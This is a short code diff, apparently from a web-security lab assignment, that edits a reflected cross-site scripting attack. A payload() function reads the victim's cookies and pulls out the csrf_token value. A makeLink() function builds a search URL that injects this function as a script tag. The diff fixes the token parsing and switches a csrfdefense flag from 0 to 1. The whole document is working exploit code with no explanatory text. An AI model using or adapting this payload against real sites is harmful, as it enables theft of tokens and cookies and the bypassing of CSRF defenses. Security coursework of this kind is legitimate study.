@@ -5,12 +5,12 @@
 function payload() {
     var cookie = document.cookie.toString();
     var trimmed = cookie.substring(cookie.indexOf("csrf_token"));
-    var token = trimmed.substring(0, trimmed.indexOf(";"));
+    var token = trimmed.indexOf(";") < 0 ? trimmed : trimmed.substring(0, trimmed.indexOf(";"));
     alert(token);
 }
 
 function makeLink(xssdefense, target) {
-    return target + "./search?csrfdefense=0&xssdefense=" + xssdefense.toString() + "&q=" + 
+    return target + "./search?csrfdefense=1&xssdefense=" + xssdefense.toString() + "&q=" + 
         encodeURIComponent("<script" + ">" + payload.toString() + ";payload();" + "<" + "/script" + ">");
 }
 
